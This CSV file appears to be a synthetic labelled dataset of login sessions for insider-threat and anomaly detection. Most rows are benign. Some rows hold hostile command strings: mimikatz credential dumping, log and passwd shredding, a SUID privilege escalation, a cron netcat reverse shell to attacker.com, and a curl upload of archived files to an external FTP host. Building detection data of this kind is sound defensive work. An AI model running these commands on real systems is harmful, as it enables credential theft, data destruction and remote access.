timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2025-03-15 20:11:51,user_0200,service_account,15,2,391,1060,6,0,1,1,mfa,192.168.114.86,"Beijing, CN",cc6e37d51d7874f5f36e2b426f806280,customer_data,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2024-03-16 15:39:00,user_0153,contractor,17,3,3128,104,1,0,1,1,sso,172.20.236.175,"Singapore, SG",3d7267117a0479c4f459e4063e369074,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-01-19 11:11:58,user_0083,employee,5,2,417,1014,14,5,1,1,password,10.118.232.3,"Moscow, RU",099ead62c990531480893da931c8e890,payroll_system,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2024-02-24 15:42:36,user_0099,contractor,12,4,795,175,5,0,1,1,mfa,172.19.55.89,"Tokyo, JP",9e61ceaa8069c4c3d83f1a887bfb3b55,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-05-23 21:00:01,user_0190,employee,11,4,2742,108,2,1,1,1,password,172.26.93.240,"New York, US",67aa6b23c3d7bee9d5bc10a04091addb,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-30 01:28:21,user_0192,contractor,17,3,1782,76,2,1,1,1,password,172.27.70.109,"New York, US",7b9efd7f7ece0fca666aeeecd5aa53ce,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-16 05:48:00,user_0001,employee,14,4,2007,187,3,1,1,1,password,10.90.185.177,"London, UK",025b1d6674df94fc2f93a350742604ca,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-26 09:29:51,user_0036,contractor,18,1,1216,145,5,1,1,1,password,192.168.24.2,"New York, US",6176d31f666e2e8ffa26ac6aeb2eb860,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-23 04:45:45,user_0155,employee,14,0,2852,36,1,1,1,1,password,172.19.165.30,"London, UK",5dc279e81b5bd5dc0c07689c834eb206,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-05-07 07:27:12,user_0187,contractor,9,2,1567,158,5,0,1,1,password,10.66.99.190,"London, UK",035ad0f98121bdf3ada18336c2ceb15f,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-09 08:20:15,user_0123,vendor,1,2,1496,124,2,3,1,1,mfa,192.168.116.250,"Cape Town, ZA",a54f4306a4f1410c3934fad19006bd60,payroll_system,ls -la; cat report.txt; logout,1,Off-Hours Access
2025-03-07 19:32:59,user_0082,contractor,12,3,800,145,4,1,1,1,password,192.168.216.81,"London, UK",f470c6af69a4672416d2bc6b4a54beb3,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-09-18 18:09:30,user_0090,contractor,13,1,990,102,1,0,1,1,password,10.44.247.253,"Singapore, SG",00b53cc9f916ee4212b89d11265ed1c3,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-09 11:25:56,user_0059,contractor,13,4,3595,198,5,0,1,1,mfa,192.168.214.28,"London, UK",7cb1730591762765c286c2f41e9fded0,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-01-05 17:50:09,user_0081,contractor,9,1,1477,105,3,0,1,1,password,172.29.186.160,"London, UK",55565c920150ff3740c0025fed47cbed,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-19 21:09:20,user_0082,employee,15,1,1914,135,1,1,1,1,mfa,192.168.76.201,"Tokyo, JP",1fcd0d060b6343697c7001bf820f82dd,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-13 07:19:48,user_0056,employee,10,4,2414,175,5,1,1,1,mfa,10.241.107.244,"London, UK",ab4978e29cabe319d4d66cb9eac10e3e,email_server,ls -la; cat report.txt; logout,1,Normal
2025-01-13 15:47:06,user_0046,contractor,18,4,2586,77,3,1,1,1,mfa,10.96.194.250,"New York, US",1915b8ac716745192e3196467eec10fd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-05-07 13:50:50,user_0010,employee,11,3,1865,117,4,1,1,1,sso,172.28.102.79,"London, UK",24aad95e975f18980760bd8b4e388a95,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-09 23:07:15,user_0176,contractor,17,1,2760,131,3,0,1,1,password,192.168.235.180,"London, UK",0d88e77286d7e4a42f9460eeaf3717a7,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-20 21:44:55,user_0068,employee,9,0,2251,64,1,0,1,1,password,10.217.97.144,"London, UK",ad026c6263aa4102ae9f8bea1b12a3fd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-06-10 04:09:22,user_0098,admin,13,6,666,1081,5,3,1,1,mfa,192.168.127.196,"Toronto, CA",aea25606727576e206b8b02d19825b33,email_server,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2025-04-06 03:52:53,user_0194,employee,5,0,373,1027,17,4,1,1,certificate,10.187.199.191,"Toronto, CA",22b8c6ae2f49e72a9bfca95c0b042c62,source_code_repo,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2025-01-19 02:20:49,user_0173,contractor,13,3,654,174,3,0,1,1,mfa,192.168.72.110,"Berlin, DE",2f4257edd677057df186d651e38a2fb5,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-05-27 21:19:32,user_0001,service_account,16,1,579,1635,10,1,1,1,mfa,10.241.108.25,"Beijing, CN",0e083814283d820b29aa5a5f254394f3,hr_portal,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2024-12-18 19:15:13,user_0024,employee,10,1,1498,33,3,0,1,1,mfa,10.116.201.45,"Tokyo, JP",227ce1f3b0afe645cec103e1ebacb945,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-03-16 16:17:59,user_0062,employee,9,3,583,156,2,0,1,1,sso,192.168.27.170,"Tokyo, JP",33e6b46142ad7ee094fc2832eac8342a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-06 20:47:01,user_0075,contractor,8,3,1279,73,5,0,1,1,password,192.168.81.56,"Singapore, SG",c4397026c26ff7af5f81dcb135d8fa4e,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-08 20:57:47,user_0119,employee,14,0,2485,155,1,1,1,1,sso,10.52.176.88,"New York, US",30f9cc62ef0dfa4de70a63174f3d5c15,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-06-10 07:07:18,user_0147,service_account,3,0,142,938,9,1,0,0,certificate,149.208.66.23,"Sao Paulo, BR",8b575dd1f76ccb8d3ff346a55c79d93e,admin_console,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2025-04-12 13:25:59,user_0156,employee,9,1,2148,90,3,1,1,1,mfa,172.16.77.64,"New York, US",2b2cb4a4ee095e7d59c0d09648618689,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-15 04:19:25,user_0048,contractor,13,1,2125,31,3,1,1,1,mfa,172.28.43.36,"Berlin, DE",5abdabfd7ba7de76f6bcc939f3df4d63,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-06-05 17:07:14,user_0075,employee,12,0,1108,168,4,1,1,1,mfa,192.168.19.16,"London, UK",0671ccba55a16c63d014d2c4ee11ac2f,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-20 22:27:19,user_0059,employee,10,1,2577,59,3,0,1,1,sso,10.127.122.167,"Berlin, DE",44765e619bee40e4c4690301eb5fb7b9,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-23 19:47:04,user_0005,employee,9,0,1857,124,5,1,1,1,sso,192.168.249.221,"London, UK",8624e8c335e4aa84bac2bd1354b678db,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-05 13:07:23,user_0148,contractor,17,4,2138,179,5,0,1,1,mfa,172.26.146.211,"London, UK",18eb1223853d25de9a505854b425b124,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-02-26 22:15:16,user_0079,employee,17,1,3379,130,5,1,1,1,mfa,172.26.50.142,"Singapore, SG",be7dfbb9474860e192a8aa1cff858581,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-06 02:01:47,user_0153,employee,10,0,1821,96,2,0,1,1,mfa,10.152.26.70,"Berlin, DE",b3504931e31f5b799aaa0af32be67e51,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-10 06:16:34,user_0161,contractor,8,4,2062,40,5,0,1,1,password,192.168.124.103,"Berlin, DE",8d3f1e51aa44c9d56e23371b05932a44,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-16 08:48:11,user_0100,employee,11,0,2608,159,1,0,1,1,sso,192.168.56.0,"Tokyo, JP",38d0d999b46bf74966fab7437cddb25f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-08 11:34:21,user_0039,contractor,18,3,1335,174,3,0,1,1,mfa,10.162.45.111,"Berlin, DE",ed3d898966847e1abe4ca02ac47edd56,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-31 17:57:18,user_0081,employee,3,5,95,1167,16,10,0,0,password,200.228.161.43,"Toronto, CA",ce511a8cfd0b863aa2e0777cd40a1af7,email_server,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-02-19 17:05:33,user_0170,vendor,3,2,503,1032,4,0,1,1,certificate,10.168.6.67,"Amsterdam, NL",b14d235ace89826ca47072bd6e44e3cb,vpn_gateway,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-09-04 13:38:27,user_0135,contractor,14,1,1528,116,2,1,1,1,password,172.29.118.132,"London, UK",b4e3b0170d3ae6d4f0c16f02f589be76,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-26 07:44:15,user_0105,employee,15,2,2399,179,3,1,1,1,password,172.19.71.199,"Tokyo, JP",7d976ffe8dfa6032617ff1a0e8d01bcf,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-10 02:25:52,user_0058,employee,9,4,2753,112,2,1,1,1,sso,172.26.75.158,"Tokyo, JP",f2e013f353de20e4c48f0629d6506943,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-12-21 12:23:06,user_0125,employee,16,4,783,197,2,1,1,1,mfa,172.27.94.108,"New York, US",84c78588230f945a374fb8f114cc5693,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-03 15:06:30,user_0125,contractor,11,4,1548,51,5,1,1,1,password,172.28.143.178,"New York, US",c832d9cf8a62ee90df8d91ad7022d27c,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-06-28 23:05:35,user_0121,employee,10,4,1356,113,4,0,1,1,sso,172.29.81.196,"Berlin, DE",ce6cdf7665e8f26166682d348c194c95,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-28 17:21:40,user_0190,contractor,10,1,3266,99,1,1,1,1,mfa,192.168.215.85,"London, UK",6d905cd6edffd1ca81949a4cdf9b343e,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-19 16:18:40,user_0129,employee,9,3,1008,62,2,0,1,1,password,10.62.66.212,"New York, US",9f1b01ee391cafb04e4e339ab323ba5b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-24 18:15:10,user_0056,employee,15,4,2299,34,3,0,1,1,sso,192.168.93.50,"Tokyo, JP",748c926d9e729ed3bb2adfcebfb31bb6,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-28 22:06:46,user_0036,contractor,13,4,1847,188,5,0,1,1,mfa,192.168.219.58,"New York, US",67297014a0dbaa80a9afcf9aac1936b7,email_server,ls -la; cat report.txt; logout,1,Normal
2024-11-26 19:14:37,user_0108,contractor,17,3,2729,27,2,0,1,1,mfa,10.232.249.171,"Singapore, SG",0b851b04e402e727e149e050fa24b4d1,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-06-22 17:22:45,user_0075,employee,18,1,2750,58,3,0,1,1,sso,172.28.210.148,"Singapore, SG",92b4d4b58505b7acafd893484148e7c8,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-14 16:12:20,user_0179,employee,12,0,444,110,2,1,1,1,mfa,192.168.192.183,"Singapore, SG",de756aa9e582727ef5817e7620ba885f,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-29 09:56:17,user_0125,employee,9,0,300,59,5,0,1,1,sso,172.31.247.162,"New York, US",3baf613752109a9809198f5d81c2d913,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-31 06:54:13,user_0003,contractor,16,2,3475,179,1,1,1,1,sso,192.168.103.100,"Berlin, DE",0919d300a15f4a5cf64e76cdccff5f9f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-11 17:09:30,user_0110,employee,17,2,418,66,3,1,1,1,mfa,10.114.28.35,"Berlin, DE",dc7b85ea088ea1aa1195a2e40e8ff420,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-22 12:07:00,user_0118,employee,13,0,2477,92,2,0,1,1,sso,192.168.230.66,"London, UK",171d3381082db96f0ce6cd9feaa5378e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-09 15:54:03,user_0167,contractor,8,3,2771,186,5,1,1,1,password,192.168.70.206,"London, UK",51566280a976f6055c0c9f97643ff2cd,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-14 14:35:00,user_0151,contractor,14,3,1373,107,1,0,1,1,sso,172.20.187.13,"New York, US",09f29daa68c556d9d78f72785d0774c5,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-02-12 21:26:17,user_0150,employee,12,1,392,41,5,1,1,1,sso,192.168.105.125,"New York, US",979270c94a81ea94430331ba9e33395b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-04 04:04:00,user_0113,employee,0,0,78,1120,9,5,0,0,password,182.235.60.18,"Beijing, CN",def379fe879b1f9c2b93f55cfdfa0c61,backup_storage,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-04-30 04:31:07,user_0081,admin,10,2,967,252,1,0,0,0,oauth,205.144.21.37,"Cape Town, ZA",923c332da252f94a5950ea596587ac2a,customer_data,ls -la; cat report.txt; logout,1,Impossible Travel
2025-01-28 05:46:20,user_0094,service_account,22,4,6695,1817,20,1,1,1,sso,172.17.175.229,"Toronto, CA",732c64028a20ef72ce5c53c66af4af21,internal_wiki,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2024-10-27 09:02:00,user_0162,contractor,17,5,3089,159,17,0,1,1,sso,10.18.184.156,"Mexico City, MX",8fa92f113fca2870f511c0668a442b1e,email_server,ls -la; cat report.txt; logout,1,Unusual Resource Access
2025-02-14 08:37:05,user_0185,contractor,11,0,1568,84,1,1,1,1,password,192.168.34.67,"Tokyo, JP",a5cd10e97154129229366982aba7e103,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-05 04:39:26,user_0002,contractor,10,0,3222,184,5,1,1,1,password,192.168.247.24,"New York, US",606c2af16ed7e80982513a56e34a3d0e,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-24 22:32:21,user_0046,employee,12,4,786,41,4,1,1,1,password,172.30.56.219,"London, UK",f6ba5bee86ffaf188714e3dbbbe20ea9,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-05-10 11:24:15,user_0119,contractor,15,2,3031,22,4,1,1,1,sso,10.180.85.119,"Singapore, SG",b8da42f65b6d8eba7a273c0c4892f58b,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-22 04:07:05,user_0149,contractor,10,2,3287,28,5,0,1,1,sso,192.168.226.213,"New York, US",2e10f0ed23c24f31d66ac085074e41fe,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-24 15:00:11,user_0164,employee,10,0,3064,161,2,0,1,1,sso,10.13.62.213,"Singapore, SG",8502352884f53e3761e93fb5b118e2d3,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-12 05:29:04,user_0119,employee,17,2,1188,150,1,1,1,1,password,10.242.1.252,"London, UK",53ff63bd33faf5fb9323a136d8202ffb,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-03-18 04:38:08,user_0043,contractor,18,0,1816,25,5,1,1,1,sso,10.117.64.175,"Singapore, SG",d2198692b13d3ff663a8be6b6715b19b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-06 14:07:12,user_0113,contractor,12,3,1415,148,5,1,1,1,mfa,172.20.152.254,"New York, US",abf4d514034ee17c9761cf0dda943e23,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-17 17:23:38,user_0005,service_account,2,0,725,184,4,3,1,1,mfa,172.19.126.57,"Beijing, CN",74c5753a0405d18383fa02ce51cf80b7,devops_pipeline,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-06-07 09:19:07,user_0069,contractor,10,3,1249,131,3,0,1,1,mfa,172.25.30.169,"New York, US",ad269ab4106d90bc0585bc086c21b047,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-07-04 19:20:49,user_0094,contractor,18,2,401,198,3,1,1,1,sso,10.46.147.222,"New York, US",db36b1f1998ab872df4b3cbcd4e5209f,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-05-20 00:17:03,user_0003,contractor,10,1,2947,63,3,0,1,1,sso,172.21.42.59,"Singapore, SG",7105d7d5489958a9be47e6f64c3c1371,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-14 11:56:20,user_0064,contractor,8,2,2392,44,4,0,1,1,sso,10.118.237.39,"Berlin, DE",2078eed3ab4d2729b4650ac5b53d892c,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-04-18 19:53:03,user_0191,contractor,15,3,3259,106,4,0,1,1,mfa,172.22.229.74,"New York, US",bace024dbfb1386b9d3a58f4a9f1883c,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-12 08:24:00,user_0022,employee,9,0,583,121,2,1,1,1,password,10.23.14.41,"New York, US",251456e37f06fbb3ef122579c13a9ace,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-05-04 12:33:21,user_0197,employee,11,4,1822,159,5,1,1,1,sso,10.109.160.177,"Berlin, DE",3ccfa3d8b962a3eb2ad2e7c2b318ca87,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-13 11:44:35,user_0073,employee,15,3,2548,87,1,0,1,1,sso,192.168.64.53,"New York, US",affc02856286a1232e9da2aec9d5dbbe,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-05-28 13:41:43,user_0096,employee,17,0,3363,118,1,0,1,1,password,192.168.201.48,"New York, US",ccc7f339321c0dddffe76edfc2842a8c,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-04-26 22:15:15,user_0173,employee,11,2,2101,193,4,0,1,1,mfa,172.22.110.240,"New York, US",59355ef3f751fbda37a0329ce6afa26b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-12-04 12:47:52,user_0150,contractor,12,4,2516,57,2,1,1,1,mfa,192.168.41.56,"Singapore, SG",c9d9dc2ccfa3850e7e79ae2c985d3025,email_server,ls -la; cat report.txt; logout,1,Normal
2024-01-19 20:39:55,user_0152,contractor,18,2,1094,41,5,0,1,1,sso,192.168.122.80,"Berlin, DE",4b04a2b5b72e0e6717e059058c2ff557,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-04-13 17:41:38,user_0146,employee,17,1,3190,86,3,1,1,1,mfa,192.168.142.22,"London, UK",d34c1ac66765fbd9e1df8b7f9ea08419,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-21 05:00:46,user_0128,contractor,13,4,3351,68,2,0,1,1,password,172.29.98.71,"Berlin, DE",83ca1a31839f58fd997d089cf8ad5f2a,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-07-13 01:31:07,user_0109,employee,16,1,827,54,2,1,1,1,password,10.180.37.118,"New York, US",19f2cff8a1fde2844a7f7a50e114c7c3,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-26 17:54:41,user_0123,admin,5,3,225,1130,3,0,0,0,certificate,173.24.108.236,"Mexico City, MX",45ee3e9fa01baedefad3fd69f4e3ca19,payroll_system,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2024-07-21 07:41:38,user_0198,employee,12,0,888,180,1,0,1,1,password,10.58.197.104,"Tokyo, JP",a9472503190baa6c0ba9c455dbb88e61,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-06-02 21:08:33,user_0032,contractor,17,2,1737,59,5,1,1,1,password,192.168.93.171,"New York, US",1ba08baebc60f66c9ef891c932fa90e4,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-14 05:58:36,user_0174,contractor,8,2,3090,194,1,1,1,1,mfa,10.215.111.85,"Singapore, SG",e7d5a90b925b7124f5ce1a3a6dad2141,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-11-15 20:24:34,user_0016,employee,10,1,2077,100,3,0,1,1,password,192.168.245.171,"Singapore, SG",f350c18b2172b0c5aa51a7cef208bae2,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-06-04 07:24:22,user_0126,employee,11,4,1029,80,3,1,1,1,mfa,192.168.183.211,"Singapore, SG",ef2b6be6ba057bb240c3b9c73d75f135,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-22 03:00:40,user_0163,employee,17,0,2586,48,5,0,1,1,sso,192.168.35.16,"New York, US",960a4b16a9b21b6305e0306d9ce4f74c,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-30 19:15:55,user_0083,employee,15,1,3200,146,5,0,1,1,mfa,172.18.97.176,"Berlin, DE",caade68f32d796a85fbeddbf574306fb,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-18 23:27:15,user_0131,contractor,16,2,3301,170,4,1,1,1,mfa,10.238.135.18,"Singapore, SG",0eb200230a171b476d7ff02bfb1efaab,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-04 08:20:42,user_0139,employee,10,2,3177,83,5,0,1,1,password,10.175.151.184,"Singapore, SG",9e7c86071557f11000b659da59c363fd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-29 15:49:52,user_0119,service_account,23,0,2723,2711,9,0,1,1,api_key,192.168.109.142,"Mexico City, MX",3109b41367d48689ebe849d5c52437ec,devops_pipeline,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2025-01-11 15:10:22,user_0096,contractor,13,1,719,75,2,0,1,1,password,192.168.105.60,"Singapore, SG",30d22a3a999ebd9f04d866d05bcaab7d,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-30 14:07:33,user_0008,contractor,10,4,1387,29,1,1,1,1,mfa,10.106.35.126,"Berlin, DE",a7b895f103a3def2c1a770314dcfc4a9,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-28 03:03:17,user_0125,service_account,23,6,4308,2809,12,2,1,1,api_key,192.168.220.169,"Moscow, RU",d0bed9003602b3b16227ba9092d212e1,hr_portal,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-09-01 01:19:55,user_0056,contractor,14,2,1318,94,2,1,1,1,sso,172.16.90.5,"Tokyo, JP",29f64d02e6e73c86dd2db895e1f506e7,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-28 18:53:28,user_0167,contractor,12,1,1514,161,3,0,1,1,sso,192.168.30.50,"New York, US",7566a9d44ada361f66a084e33ff26f7a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-02-14 17:23:07,user_0009,contractor,14,3,2043,45,3,1,1,1,sso,192.168.127.103,"Singapore, SG",f95e402a239db66674deb4586fd68b1f,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-05-17 12:58:36,user_0017,contractor,17,3,3117,103,4,0,1,1,mfa,192.168.14.220,"Tokyo, JP",797d0c5556a1b334e7c24c33cbf4b0d8,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-08 22:06:37,user_0010,employee,13,2,2424,122,13,1,1,1,sso,172.31.194.105,"Beijing, CN",b073a1aa2e1b025702b65d0203c9784a,vpn_gateway,ls -la; cat report.txt; logout,1,Unusual Resource Access
2025-01-29 00:18:29,user_0023,contractor,8,3,1926,43,1,1,1,1,password,172.22.34.119,"Singapore, SG",c5ce1a64677dc29c56f4dea496bae114,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-07 07:28:44,user_0114,contractor,14,4,391,125,2,0,1,1,password,10.151.194.21,"Berlin, DE",0d08b16bb18d2693ee617ec7f73a8c53,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-11 09:56:07,user_0100,contractor,10,0,1095,128,2,1,1,1,mfa,192.168.146.175,"Berlin, DE",19f50b8ef13fcfec70afd6c5cc8cb6f0,customer_data,ls -la; cat report.txt; logout,1,Normal
